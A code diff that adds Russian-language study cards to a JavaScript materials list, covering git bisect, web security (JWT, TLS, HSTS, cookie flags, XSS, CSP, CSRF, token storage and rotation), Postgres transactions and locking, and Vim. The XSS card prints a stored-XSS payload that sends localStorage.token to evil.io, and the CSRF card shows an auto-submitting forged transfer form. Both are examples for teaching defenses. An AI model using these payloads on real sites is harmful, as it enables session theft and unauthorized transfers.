@@ -201,7 +201,30 @@ var Materials = {
       id: uuidv4(),
       tags: "rebase squash rerere force-with-lease merge-base конфликты",
       link: "https://git-scm.com/docs/git-rerere"
+    },
+    {
+      title: `bisect: найти коммит, который сломал`,
+      text: `
+      <t>Игра «угадай число» с коммитами: каждый ответ — один бит, отсекает половину. 100 коммитов — ~7 ответов</t><br>
+      <c>хороший ●──●──●──●──●──●──●──● сломанный</c><br><br>
+      <c>git bisect start</c><br>
+      <c>git bisect bad</c><k>              # текущий — сломан</k><br>
+      <c>git bisect good a1b2c3d</c><k>     # этот — точно был хороший</k><br>
+      <t>гит прыгает в середину, проверяешь и отвечаешь:</t><br>
+      <c>git bisect good</c><k>   # тут работает</k><br>
+      <c>git bisect bad</c><k>    # тут уже сломано</k><br>
+      <c>→ e5f6a7b is the first bad commit</c><br>
+      <c>git bisect reset</c><k>  # вернуться, где был</k><br><br>
+      <b>Автоматически</b><t>— гит сам гоняет проверку: прошла = good, упала = bad:</t><br>
+      <c>git bisect run npm test</c><br>
+      <c>git bisect run sh -c '! grep -q Kubernetes src/stores/MaterialsInfo.js'</c><k>  # ! — «нашлось = плохо»</k><br><br>
+      <b>Перед bisect</b><t>всё закоммитить или в stash — гит переключается по коммитам</t>
+      `,
+      id: uuidv4(),
+      tags: "git bisect бинарный поиск сломанный коммит good bad run reset",
+      link: "https://git-scm.com/docs/git-bisect"
     }
+
   ],
   "React hooks": [
     {
@@ -1200,6 +1223,256 @@ var Materials = {
       link: "https://web.dev/articles/rendering-on-the-web"
     }
   ],
+  "Безопасность": [
+    {
+      title: `Пропуск: сессия против JWT`,
+      text: `
+      <t>После логина сервер выдаёт</t><b>пропуск</b><t>. Кто украл пропуск — тот и пользователь, пароль уже не нужен</t><br><br>
+      <c>СЕССИЯ                         JWT</c><br>
+      <c>sid=a8f3c91…                   {user, exp} + подпись</c><br>
+      <c>сам по себе ничего не значит   всё написано внутри</c><br>
+      <c>сервер смотрит в хранилище     сервер проверяет подпись</c><br>
+      <c>отозвать: удалить запись ✓     отозвать: никак до exp ✗</c><br><br>
+      <b>JWT</b><t>не нужно ходить в общее хранилище сессий — удобно для микросервисов и большой нагрузки. Цена: нельзя отозвать, поэтому живёт</t><b>коротко</b><t>(5–15 минут) — отсюда «протухание» и refresh-токен</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность авторизация сессия jwt токен session отзыв",
+      link: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Authentication"
+    },
+    {
+      title: `MITM и TLS`,
+      text: `
+      <b>Man in the middle</b><t>— атакующий на пути трафика: публичный Wi-Fi, ARP-spoofing в локалке, роутер, провайдер</t><br><br>
+      <c>ты ──→ [роутер] ──→ [провайдер] ──→ сервер</c><br>
+      <c>          👁 читает cookie, подменяет JS в ответе</c><br><br>
+      <b>TLS (HTTPS)</b><t>закрывает обе дыры:</t><br>
+      <b>шифрование</b><t>— видно только «кто-то говорит с bank.ru»</t><br>
+      <b>сертификат</b><t>— браузер проверяет, что на том конце настоящий bank.ru: подпись цепочкой до доверенного корневого CA</t><br><br>
+      <t>Остаточные дыры: первый http-запрос (→ HSTS), cookie без Secure, подменённый корневой CA</t><br>
+      <b>Mixed content</b><t>(скрипт по http на https-странице) браузеры уже блокируют</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность mitm man in the middle tls https сертификат",
+      link: "https://developer.mozilla.org/en-US/docs/Web/Security/Transport_Layer_Security"
+    },
+    {
+      title: `HSTS и preload`,
+      text: `
+      <b>Атака SSL stripping:</b><t>ввели bank.ru → браузер идёт на http → сервер отвечает «иди на https», но этот ответ открытым текстом. Атакующий его перехватывает: с вами говорит по http, с банком по https</t><br><br>
+      <b>Бэкенд / devops</b><t>добавляет заголовок:</t><br>
+      <c>Strict-Transport-Security: max-age=31536000; includeSubDomains</c><br>
+      <b>Браузер</b><t>получив его один раз по https, запоминает на год и сам меняет http → https</t><b>до отправки</b><t>. Перехватывать нечего</t><br><br>
+      <b>Дыра:</b><t>самый первый визит</t><br>
+      <b>preload:</b><t>владелец сайта сам подаёт домен на hstspreload.org (max-age от года + includeSubDomains + preload) — домен зашивается в Chrome, Firefox, Safari. Браузер знает про https ещё до первого визита</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность hsts preload ssl stripping https редирект",
+      link: "https://hstspreload.org/"
+    },
+    {
+      title: `Флаги cookie: Secure, HttpOnly, SameSite`,
+      text: `
+      <t>Три флага — три разных вора:</t><br><br>
+      <c>Secure    только по https            → MITM</c><br>
+      <c>HttpOnly  JS не видит document.cookie → XSS</c><br>
+      <c>SameSite  не уходит с чужих сайтов   → CSRF</c><br><br>
+      <c>Set-Cookie: sid=a8f3c; Secure; HttpOnly; SameSite=Lax</c><br><br>
+      <b>Secure</b><t>— без него хватит одного http-запроса на домен (картинка, старая ссылка), и cookie уйдёт открытым текстом</t><br>
+      <b>HttpOnly</b><t>— внедрённый скрипт не прочитает и не отправит себе сессию</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность cookie secure httponly samesite флаги",
+      link: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies#security"
+    },
+    {
+      title: `Префикс __Host-`,
+      text: `
+      <t>Не флаг, а</t><b>префикс имени</b><t>cookie. Браузер примет её, только если есть Secure, Path=/ и</t><b>нет Domain:</b><br><br>
+      <c>Set-Cookie: __Host-sid=a8f3c; Secure; HttpOnly; Path=/; SameSite=Lax</c><br><br>
+      <b>Зачем:</b><t>без него взломанный поддомен (promo.bank.ru) может поставить cookie на весь .bank.ru и</t><b>подсунуть свою сессию</b><br><br>
+      <b>Session fixation:</b><t>вы логинитесь и работаете в сессии, id которой атакующий знает заранее</t><br><br>
+      <t>С</t><c>__Host-</c><t>cookie привязана строго к одному хосту — поддомены её не перезапишут.</t><c>__Secure-</c><t>— мягче, требует только Secure</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность cookie __host- __secure- session fixation поддомен",
+      link: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#cookie_prefixes"
+    },
+    {
+      title: `Подмена корневого CA`,
+      text: `
+      <t>Браузер верит сертификату, если он подписан</t><b>корневым CA</b><t>из доверенных в системе</t><br><br>
+      <b>Атака:</b><t>в систему добавили свой корневой CA — корпоративный ноутбук или вирус</t><br>
+      <c>ты ──🔒──→ [прокси] ──🔒──→ bank.ru</c><br>
+      <c>           расшифровал всё, показал сертификат</c><br>
+      <c>           «bank.ru», подписанный своим CA</c><br><br>
+      <t>Замок зелёный, а прокси видит и меняет весь трафик.</t><b>HTTPS формально работает, защиты нет</b><br><br>
+      <b>Веб:</b><t>сайт это не заметит, лекарства нет (HPKP из браузеров убрали)</t><br>
+      <b>Мобилки:</b><t>certificate pinning — приложение знает сертификат своего сервера и отвергает любой другой, даже с «доверенной» подписью</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность ca корневой сертификат mitm pinning tls inspection прокси",
+      link: "https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning"
+    },
+    {
+      title: `XSS: три пути на страницу`,
+      text: `
+      <t>Цель — чтобы</t><b>чужой JS выполнился в вашем домене.</b><t>Тогда у него все права страницы: DOM, localStorage, запросы с вашими cookie. TLS не помогает — скрипт приходит по честному https</t><br><br>
+      <b>Stored</b><t>— сохранили в базу, показали всем:</t><br>
+      <c><img src=x onerror="fetch('//evil.io?c='+localStorage.token)"></c><br>
+      <b>Reflected</b><t>— сервер вернул то, что пришло в запросе. Жертве шлют ссылку:</t><br>
+      <c>bank.ru/search?q=<script>…</script></c><br>
+      <b>DOM-based</b><t>— сервер ни при чём, фронт сам вставил данные в DOM:</t><br>
+      <c>el.innerHTML = location.hash.slice(1)</c><br><br>
+      <t>Для фронта главный — третий: всё происходит в вашем коде</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность xss stored reflected dom-based скрипт инъекция",
+      link: "https://owasp.org/www-community/attacks/xss/"
+    },
+    {
+      title: `XSS в React: где не спасает`,
+      text: `
+      <b>Из коробки:</b><t>всё в JSX как текст экранируется</t><br>
+      <c><div>{comment}</div></c><k>  // script покажется текстом ✓</k><br><br>
+      <b>Дыры:</b><br>
+      <c>dangerouslySetInnerHTML={{__html: html}}</c><k>  // HTML как есть</k><br>
+      <c>html-react-parser(html)</c><k>                   // то же самое</k><br>
+      <c><a href={userUrl}></c><k>  // javascript:… — React 19 блокирует, 18 предупреждает</k><br>
+      <c>ref.current.innerHTML = …</c><k>  // мимо React</k><br>
+      <c>eval · new Function · setTimeout('строка')</c><br>
+      <t>сторонние библиотеки, которые внутри делают innerHTML</t><br><br>
+      <b>Защита слоями:</b><br>
+      <t>1. Не вставлять HTML, а если надо —</t><b>DOMPurify</b><br>
+      <t>2. URL — только http:, https:, mailto:</t><br>
+      <t>3.</t><b>CSP</b><t>— вставили, но не запустится</t><br>
+      <t>4.</t><b>HttpOnly</b><t>— запустился, но сессию не унесёт</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность xss react dangerouslysetinnerhtml dompurify href javascript",
+      link: "https://github.com/cure53/DOMPurify"
+    },
+    {
+      title: `CSP: что можно странице`,
+      text: `
+      <t>Сервер присылает список: что этой странице разрешено загружать и выполнять</t><br>
+      <c>Content-Security-Policy:</c><br>
+      <c>  script-src 'self';</c><k>                  // скрипты только свои</k><br>
+      <c>  connect-src 'self' api.bank.ru;</c><k>     // запросы только сюда</k><br>
+      <c>  upgrade-insecure-requests</c><k>            // ресурсы страницы http → https</k><br><br>
+      <b>Против XSS:</b><t>внедрённый inline-скрипт и onerror= не запустятся (если нет 'unsafe-inline'), а connect-src не даст отправить данные на evil.io</t><br><br>
+      <b>Не заменяет флаги cookie:</b><br>
+      <c>CSP       не даёт чужому скрипту запуститься</c><br>
+      <c>HttpOnly  запустился — не прочитает cookie</c><br>
+      <c>Secure    утечка по http вне страницы (переход по ссылке)</c><br>
+      <c>__Host-   атакующий поддомен шлёт свои заголовки, ваша CSP на него не действует</c><br><br>
+      <b>Нюанс:</b><t>с HttpOnly скрипт не украдёт сессию, но может сделать fetch со страницы — браузер сам приложит cookie. Поэтому нужны все слои</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность csp content-security-policy xss script-src connect-src unsafe-inline",
+      link: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP"
+    },
+    {
+      title: `CSRF: действие от вашего имени`,
+      text: `
+      <t>Вор ничего не крадёт. Пользуется тем, что</t><b>браузер сам прикладывает cookie</b><t>к запросу на ваш домен, откуда бы он ни пришёл</t><br><br>
+      <t>Залогинены в bank.ru, открыли evil.io:</t><br>
+      <c><form action="https://bank.ru/transfer" method="POST"></c><br>
+      <c>  <input name="to" value="hacker"></c><br>
+      <c></form><script>document.forms[0].submit()</script></c><br><br>
+      <c>evil.io ──POST──→ bank.ru + cookie bank.ru → перевод ✓</c><br><br>
+      <t>Ответ evil.io не прочитает (same-origin policy), но</t><b>действие уже выполнено</b><br>
+      <c>XSS   чужой код ВНУТРИ страницы — может всё</c><br>
+      <c>CSRF  чужая страница СНАРУЖИ — только запрос вслепую</c><br><br>
+      <b>Защита:</b><br>
+      <c>SameSite=Strict</c><k>  // никогда с чужого сайта</k><br>
+      <c>SameSite=Lax</c><k>     // только переход по ссылке (GET) — дефолт Chrome с 2020</k><br>
+      <c>SameSite=None</c><k>    // всегда, только с Secure — для виджетов</k><br>
+      <b>CSRF-токен</b><t>— случайное значение в странице, сервер сверяет. evil.io его не знает</t><br>
+      <b>Свой заголовок / JSON</b><t>— с чужого сайта вызовет CORS preflight, форма такой не поставит</t><br>
+      <b>GET не должен менять данные</b><t>— при Lax он проходит</t><br><br>
+      <b>Токен в заголовке Authorization</b><t>(не cookie) — CSRF невозможен, браузер сам ничего не прикладывает. Зато XSS уносит его одной строчкой</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность csrf xsrf samesite lax strict csrf-токен cors preflight",
+      link: "https://owasp.org/www-community/attacks/csrf"
+    },
+    {
+      title: `Где хранить пропуск`,
+      text: `
+      <b>При XSS игра уже проиграна</b><t>— скрипт действует от вашего имени, где бы ни лежал пропуск. Вопрос лишь:</t><b>унесёт ли он пропуск к себе</b><t>и будет пользоваться после закрытия вкладки</t><br><br>
+      <c>                     XSS унесёт?     CSRF?        перезагрузка</c><br>
+      <c>localStorage         одной строкой   нет          жив</c><br>
+      <c>sessionStorage       да              нет          жив во вкладке</c><br>
+      <c>переменная JS        сложно*         нет          пропал</c><br>
+      <c>HttpOnly cookie      нет             да→SameSite  жив</c><br>
+      <k>* замыкание не прочитать, но можно подменить fetch и поймать заголовок</k><br><br>
+      <b>Сейчас делают:</b><br>
+      <c>access   в памяти JS → Authorization: Bearer, живёт 5–15 мин</c><br>
+      <c>refresh  HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh</c><br>
+      <t>или</t><b>BFF</b><t>— токены держит свой бэкенд, у браузера только сессионная cookie. Рекомендация OAuth для SPA: в браузере нечего красть</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность токен хранение localstorage httponly cookie bff access refresh",
+      link: "https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps"
+    },
+    {
+      title: `Access + refresh`,
+      text: `
+      <b>Проблема:</b><t>JWT не отозвать → короткий срок → выкидывает на логин каждые 15 минут</t><br><br>
+      <c>access   «пропуск в здание»  15 мин   с КАЖДЫМ запросом к API</c><br>
+      <c>refresh  «паспорт»           30 дней  ТОЛЬКО на /auth/refresh</c><br><br>
+      <c>10:00  логин → access(до 10:15) + refresh</c><br>
+      <c>10:14  GET /profile + access          ✓</c><br>
+      <c>10:16  GET /orders  + access          ✗ 401</c><br>
+      <c>       POST /auth/refresh + refresh   → новый access</c><br>
+      <c>       GET /orders  + новый access    ✓  пользователь не заметил</c><br><br>
+      <b>access</b><t>летает постоянно — украдут, через 15 минут бесполезен</t><br>
+      <b>refresh</b><t>ходит в одно место, лежит в HttpOnly и</t><b>хранится в базе сервера</b><t>— его можно отозвать. «Выйти на всех устройствах» = удалить refresh</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность access refresh token jwt протухание 401 отзыв",
+      link: "https://auth0.com/docs/secure/tokens/refresh-tokens"
+    },
+    {
+      title: `Ротация refresh: поймать вора`,
+      text: `
+      <t>При каждом обновлении сервер выдаёт</t><b>новый refresh</b><t>, старый помечает использованным</t><br><br>
+      <c>вы:   refresh_1 → access + refresh_2   (refresh_1 сгорел)</c><br>
+      <c>вор:  refresh_1 → «уже использован!»</c><br>
+      <c>      → кража → отзываю ВСЮ цепочку, включая refresh_2</c><br>
+      <c>      → вылетают оба, вы логинитесь заново</c><br><br>
+      <t>Сервер не знает, кто из двоих настоящий, но знает:</t><b>один refresh использовали дважды</b><t>— так бывает только при краже</t><br><br>
+      <b>Нюанс:</b><t>две вкладки обновляют одновременно — ложная тревога. Лечат коротким окном повторного использования (несколько секунд) или обновлением через одну вкладку</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность refresh rotation ротация reuse detection кража токена",
+      link: "https://auth0.com/docs/secure/tokens/refresh-tokens/refresh-token-rotation"
+    },
+    {
+      title: `Привязка к устройству: DPoP, DBSC`,
+      text: `
+      <b>Идея:</b><t>токен с новой машины — сразу отзывать. Как понять, что машина новая?</t><br><br>
+      <b>По признакам — ненадёжно:</b><br>
+      <c>IP          меняется сам (4G, VPN), а за NAT — весь офис</c><br>
+      <c>User-Agent  вор скопирует строку</c><br>
+      <c>Fingerprint нестабилен и подделывается</c><br>
+      <t>Используют как оценку риска: «новое устройство → подтвердите по SMS», но не блок</t><br><br>
+      <b>Криптографически — правильно:</b><br>
+      <c>логин:   браузер создаёт пару ключей, приватный НЕ экспортируется</c><br>
+      <c>         публичный → серверу: токен действует только с ним</c><br>
+      <c>запрос:  токен + подпись приватным ключом</c><br>
+      <c>вор:     токен есть, подписать нечем → ✗</c><br><br>
+      <b>DPoP</b><t>— OAuth, ключ в WebCrypto</t><br>
+      <b>DBSC</b><t>— Chrome, сессионные cookie, ключ в</t><b>TPM</b><t>(аппаратный чип, не достать даже вирусом)</t><br>
+      <b>mTLS</b><t>— клиентский сертификат, банки и корпоративные системы</t><br><br>
+      <b>Предел:</b><t>XSS на открытой странице может попросить подписать свой запрос. Закрывается кража</t><b>с выносом</b><t>— самый опасный сценарий</t>
+      `,
+      id: uuidv4(),
+      tags: "безопасность dpop dbsc mtls tpm привязка токена устройство fingerprint webcrypto",
+      link: "https://datatracker.ietf.org/doc/html/rfc9449"
+    }
+
+  ],
   Server: [
     {
       title: `Путь запроса на сервере`,
@@ -1330,6 +1603,160 @@ var Materials = {
       id: uuidv4(),
       tags: "nginx upstream proxy_pass location reverse proxy",
       link: "https://nginx.org/en/docs/beginners_guide.html"
+    }
+  ],
+  Postgres: [
+    {
+      title: `Postgres в Docker: run и exec`,
+      text: `
+      <c>образ ── docker run ──→ контейнер ── docker exec ──→ команда внутри</c><br>
+      <c>        создать+запустить ОДИН раз    зайти сколько угодно</c><br><br>
+      <c>docker run -d --name pg -p 5432:5432 -e POSTGRES_PASSWORD=dev postgres</c><br>
+      <c>-d          в фоне, терминал свободен</c><br>
+      <c>--name pg   имя (иначе elegant_buck)</c><br>
+      <c>-p мак:конт проброс порта</c><br>
+      <c>-e K=V      переменная внутри контейнера</c><br>
+      <c>-v том:/путь данные переживут docker rm</c><br><br>
+      <c>docker exec -it pg psql -U postgres</c><br>
+      <c>-i  держать ввод   -t  нормальный терминал</c><br>
+      <c>pg — контейнер, psql — клиент внутри, -U postgres — пользователь базы</c><br><br>
+      <b>Повторный run</b><t>= второй контейнер → port is already allocated. Переименовать:</t><c>docker rename elegant_buck pg</c><br>
+      <t>Закрыл терминал — контейнер живёт: он в OrbStack, не в окне</t>
+      `,
+      id: uuidv4(),
+      tags: "postgres docker run exec флаги порт контейнер orbstack psql",
+      link: "https://hub.docker.com/_/postgres"
+    },
+    {
+      title: `psql: точка с запятой и приглашение`,
+      text: `
+      <b>Enter не выполняет.</b><t>psql копит строки до</t><c>;</c><t>, для SQL перенос строки = пробел</t><br><br>
+      <c>postgres=#   новая команда</c><br>
+      <c>postgres-#   начата, ; ещё не было</c><br>
+      <c>postgres(#   открыта скобка</c><br>
+      <c>postgres'#   открыта кавычка</c><br>
+      <c>postgres=*#  внутри транзакции (BEGIN)</c><br><br>
+      <b>Забыл ;</b><t>— следующая команда приклеится:</t><c>syntax error at or near "INTO"</c><t>. Место ошибки — где база поняла, не где ошиблись</t><br><br>
+      <c>\\l  базы   \\dt  таблицы   \\d accounts  устройство таблицы</c><br>
+      <c>\\e  открыть редактор   \\r  очистить буфер   \\q  выход</c><br>
+      <t>Команды psql — с</t><c>\\</c><t>, без</t><c>;</c><t>. Строки в SQL — 'одинарные', "двойные" — имена</t>
+      `,
+      id: uuidv4(),
+      tags: "postgres psql точка с запятой приглашение команды \\d \\dt \\e",
+      link: "https://www.postgresql.org/docs/current/app-psql.html"
+    },
+    {
+      title: `CREATE TABLE и что внутри`,
+      text: `
+      <c>CREATE TABLE accounts (</c><br>
+      <c>  id      serial PRIMARY KEY,</c><br>
+      <c>  owner   text NOT NULL,</c><br>
+      <c>  balance int  NOT NULL CHECK (balance >= 0)</c><br>
+      <c>);</c><br><br>
+      <b>serial</b><t>— не тип: int + значение по умолчанию</t><c>nextval('accounts_id_seq'::regclass)</c><t>— счётчик.</t><c>::тип</c><t>— приведение типа</t><br>
+      <b>PRIMARY KEY</b><t>— уникальный, не пустой + индекс</t><c>btree</c><t>: миллион строк за ~20 шагов</t><br>
+      <b>NOT NULL</b><t>— NULL значит «неизвестно», не пустая строка и не 0</t><br>
+      <b>CHECK</b><t>— правило бизнеса в самой базе: никакой код не обойдёт. Имя:</t><c>accounts_balance_check</c><br>
+      <b>Деньги — int в копейках.</b><t>float: 0.1 + 0.2 = 0.30000000000000004</t><br>
+      <c>public.accounts</c><t>— public это схема, «папка» внутри базы</t><br><br>
+      <b>Кредит:</b><c>CHECK (balance >= -credit_limit)</c><t>— проверка двух колонок, пишется отдельно</t>
+      `,
+      id: uuidv4(),
+      tags: "postgres create table serial primary key not null check btree деньги копейки",
+      link: "https://www.postgresql.org/docs/current/ddl-constraints.html"
+    },
+    {
+      title: `serial: дырки в нумерации`,
+      text: `
+      <c>INSERT … VALUES ('Вор', -100);</c><k>  // ошибка CHECK, но id 3 уже выдан</k><br>
+      <c>INSERT … VALUES ('Вика', 7000);</c><k> // получит id 4</k><br><br>
+      <t>Счётчик</t><b>не участвует в откате</b><t>намеренно: иначе 100 параллельных вставок стояли бы в очереди, ожидая, закоммитится ли каждая. Он раздаёт номера всем и не берёт назад</t><br><br>
+      <b>id гарантирует уникальность, но не непрерывность.</b><t>Сквозная нумерация без пропусков (счета-фактуры) — отдельным механизмом</t>
+      `,
+      id: uuidv4(),
+      tags: "postgres serial sequence дырки id нумерация rollback",
+      link: "https://www.postgresql.org/docs/current/functions-sequence.html"
+    },
+    {
+      title: `SELECT и UPDATE: колонки и строки`,
+      text: `
+      <c>SELECT  колонки  FROM таблица  WHERE  строки</c><br>
+      <c>SELECT * FROM accounts WHERE id = 1;</c><k>       // все колонки, одна строка</k><br>
+      <c>SELECT owner, balance FROM accounts;</c><k>       // две колонки, все строки</k><br>
+      <c>SELECT * FROM accounts ORDER BY id;</c><k>        // без ORDER BY порядок не обещан</k><br><br>
+      <c>UPDATE accounts SET balance = balance - 3000 WHERE id = 1 RETURNING *;</c><br>
+      <b>balance - 3000</b><t>— считает сама база из текущего значения, в один приём</t><br>
+      <b>RETURNING</b><t>— часть UPDATE, вернуть изменённое. Отдельно — syntax error</t><br>
+      <c>UPDATE 1</c><t>— сколько строк изменено, 0 — WHERE ничего не нашёл</t><br><br>
+      <b>Ловушка:</b><t>UPDATE без WHERE меняет ВСЕ строки. Сначала SELECT с тем же WHERE, потом UPDATE.</t><c>SELECT *</c><t>— для консоли, в коде колонки явно</t>
+      `,
+      id: uuidv4(),
+      tags: "postgres select update where returning order by колонки строки",
+      link: "https://www.postgresql.org/docs/current/dml-update.html"
+    },
+    {
+      title: `Транзакция и MVCC`,
+      text: `
+      <c>BEGIN;</c><br>
+      <c>UPDATE accounts SET balance = balance - 1000 WHERE id = 1;</c><br>
+      <c>UPDATE accounts SET balance = balance + 1000 WHERE id = 2;</c><br>
+      <c>COMMIT;</c><k>   // или ROLLBACK — всё отменить</k><br><br>
+      <b>Всё или ничего.</b><t>До COMMIT изменения видит только эта транзакция. Ошибка внутри →</t><c>current transaction is aborted</c><t>до ROLLBACK</t><br><br>
+      <b>MVCC:</b><t>UPDATE не переписывает строку, а пишет новую версию в конец, старую помечает мёртвой:</t><br>
+      <c>[А 9000 ✗] [Б 5000] [Вика 7000] [А 8900 ✓]</c><br>
+      <t>Поэтому после UPDATE строки «переезжают» в конец. Читатели видят старую версию и не ждут писателей. Мёртвые версии убирает</t><b>VACUUM</b>
+      `,
+      id: uuidv4(),
+      tags: "postgres транзакция begin commit rollback mvcc vacuum версии строки",
+      link: "https://www.postgresql.org/docs/current/mvcc-intro.html"
+    },
+    {
+      title: `Блокировка строки и lost update`,
+      text: `
+      <b>UPDATE ставит блокировку:</b><t>второй UPDATE той же строки ждёт COMMIT первого, а SELECT читает старую версию без ожидания</t><br><br>
+      <b>Lost update</b><t>— код читает число и пишет готовый результат:</t><br>
+      <c>const { balance } = await db.query('SELECT balance …');</c><br>
+      <c>await db.query('UPDATE … SET balance = $1', [balance - 1000]);</c><br><br>
+      <c>A: читает X ─────── пишет X−1000 ✓</c><br>
+      <c>B:    читает X ─────────────────── пишет X−1000 (затёр A)</c><br><br>
+      <t>Два списания, а баланс уменьшился на одно. База сделала ровно то, что сказали:</t><b>B посчитал по устаревшему чтению</b>
+      `,
+      id: uuidv4(),
+      tags: "postgres блокировка row lock lost update гонка списание",
+      link: "https://www.postgresql.org/docs/current/explicit-locking.html"
+    },
+    {
+      title: `Починка: FOR UPDATE или атомарный UPDATE`,
+      text: `
+      <b>1. Блокировать при чтении:</b><br>
+      <c>BEGIN;</c><br>
+      <c>SELECT balance FROM accounts WHERE id = 1 FOR UPDATE;</c><br>
+      <c>A: читает X 🔒 ── пишет X−1000, COMMIT 🔓</c><br>
+      <c>B:   ждёт уже на чтении ⏳ ─── читает X−1000 🔒 ── пишет X−2000 ✓</c><br><br>
+      <b>2. Отдать вычисление базе:</b><br>
+      <c>UPDATE accounts SET balance = balance - 1000</c><br>
+      <c>WHERE id = 1 AND balance >= 1000;</c><k>  // UPDATE 0 — денег нет</k><br><br>
+      <b>Атомарный UPDATE</b><t>— когда всё решается одной командой.</t><b>FOR UPDATE</b><t>— когда между чтением и записью логика: лимиты, комиссия, другой сервис.</t><b>Версия строки</b><t>(оптимистичная) — когда конфликты редки</t>
+      `,
+      id: uuidv4(),
+      tags: "postgres for update атомарный update гонка починка блокировка",
+      link: "https://www.postgresql.org/docs/current/sql-select.html#SQL-FOR-UPDATE-SHARE"
+    },
+    {
+      title: `Deadlock`,
+      text: `
+      <t>Два встречных перевода:</t><br>
+      <c>A: UPDATE id=1 🔒1 … UPDATE id=2 — ждёт B</c><br>
+      <c>B: UPDATE id=2 🔒2 … UPDATE id=1 — ждёт A</c><br>
+      <c>A держит 1, ждёт 2 ──→ ┐</c><br>
+      <c>B держит 2, ждёт 1 ←── ┘  круг: никто не дождётся</c><br><br>
+      <t>Postgres сам находит круг через ~1 с и убивает одну транзакцию:</t><c>ERROR: deadlock detected</c><t>. Убитой — ROLLBACK, выжившая коммитит</t><br><br>
+      <b>Не допускать:</b><t>блокировать строки всегда в одном порядке:</t><br>
+      <c>SELECT * FROM accounts WHERE id IN (1, 2) ORDER BY id FOR UPDATE;</c>
+      `,
+      id: uuidv4(),
+      tags: "postgres deadlock взаимная блокировка порядок for update",
+      link: "https://www.postgresql.org/docs/current/explicit-locking.html#LOCKING-DEADLOCKS"
     }
   ],
   Queues: [
@@ -1627,6 +2054,84 @@ var Materials = {
       link: "https://ss64.com/mac/lsof.html"
     }
   ],
+  Vim: [
+    {
+      title: `Режимы, вход и выход`,
+      text: `
+      <t>Одни и те же клавиши делают разное в зависимости от</t><b>режима</b><br><br>
+      <c>          i               Esc</c><br>
+      <c>NORMAL ───────→ INSERT ───────→ NORMAL</c><br>
+      <c>  │ :</c><br>
+      <c>  ↓</c><br>
+      <c>COMMAND (строка внизу)</c><br><br>
+      <b>NORMAL</b><t>— открывается в нём. Буквы здесь команды, а не текст</t><br>
+      <b>INSERT</b><t>— обычная печать, внизу</t><c>-- INSERT --</c><br>
+      <b>Esc</b><t>— всегда назад в NORMAL. Потерялся — жми Esc</t><br><br>
+      <c>:w     сохранить</c><br>
+      <c>:q     выйти (не даст, если есть несохранённое)</c><br>
+      <c>:wq    сохранить и выйти</c><br>
+      <c>:q!    выйти БЕЗ сохранения — аварийный выход</c><br><br>
+      <t>Учебник прямо в терминале:</t><c>vimtutor</c>
+      `,
+      id: uuidv4(),
+      tags: "vim режимы normal insert выход wq q! vimtutor",
+      link: "https://vimhelp.org/"
+    },
+    {
+      title: `Двоеточие или нет`,
+      text: `
+      <t>Два вида команд — и главная ошибка новичка:</t><br><br>
+      <c>:команда + Enter   строка внизу: :w :q :18 :set number</c><br>
+      <c>команда без :      NORMAL, срабатывает сразу: dd 3dd u o i x</c><br><br>
+      <c>:3dd</c><k>  // E492: Not an editor command — так нельзя</k><br>
+      <c>3dd</c><k>   // три клавиши подряд, без : и без Enter</k><br><br>
+      <b>Число перед командой</b><t>— повторить:</t><c>3dd</c><t>,</t><c>5x</c><t>,</t><c>2o</c><br><br>
+      <b>Хаос режимов:</b><t>печатаешь, думая что в INSERT, а ты в NORMAL — буквы выполняются как команды (</t><c>x</c><t>удалил символ,</t><c>d</c><t>начал удаление). Лечение:</t><c>Esc</c><t>, потом</t><c>u</c><t>столько раз, сколько нужно</t>
+      `,
+      id: uuidv4(),
+      tags: "vim двоеточие ex команды normal e492 повтор число",
+      link: "https://vimhelp.org/cmdline.txt.html"
+    },
+    {
+      title: `Перемещение`,
+      text: `
+      <c>:set number   номера строк слева</c><br>
+      <c>:18           на строку 18          18G — то же</c><br>
+      <c>gg / G        в начало / в конец файла</c><br>
+      <c>0 / $         в начало / в конец строки</c><br>
+      <c>w / b         слово вперёд / назад</c><br>
+      <c>h j k l       ← ↓ ↑ →  (стрелки тоже работают)</c><br><br>
+      <b>Поиск:</b><br>
+      <c>/WORDCHARS    найти вниз по файлу</c><br>
+      <c>n / N         следующее / предыдущее совпадение</c>
+      `,
+      id: uuidv4(),
+      tags: "vim перемещение строка gg G поиск set number hjkl",
+      link: "https://vimhelp.org/motion.txt.html"
+    },
+    {
+      title: `Правка`,
+      text: `
+      <b>Войти в печать:</b><br>
+      <c>i / a         перед курсором / после</c><br>
+      <c>I / A         в начале строки / в конце строки</c><br>
+      <c>o / O         новая строка ниже / выше</c><br><br>
+      <b>Удалить, копировать, вставить:</b><br>
+      <c>x             символ под курсором</c><br>
+      <c>dd / 3dd      строку / три строки</c><br>
+      <c>yy            скопировать строку (yank)</c><br>
+      <c>p / P         вставить ниже / выше</c><br><br>
+      <b>Отмена:</b><br>
+      <c>u             отменить</c><br>
+      <c>Ctrl + r      вернуть отменённое</c><br><br>
+      <b>Замена во всём файле:</b><br>
+      <c>:%s/старое/новое/g</c><k>   // % — весь файл, g — все вхождения в строке</k>
+      `,
+      id: uuidv4(),
+      tags: "vim правка dd yy p undo u insert o a замена s",
+      link: "https://vimhelp.org/change.txt.html"
+    }
+  ],
   Node: [
     {
       title: `NVM изменение версии`,
@@ -1820,6 +2325,248 @@ var Materials = {
       id: uuidv4(),
       tags: "",
       link: "https://stackoverflow.com/questions/44769404/jest-spyon-function-called"
+    }
+  ],
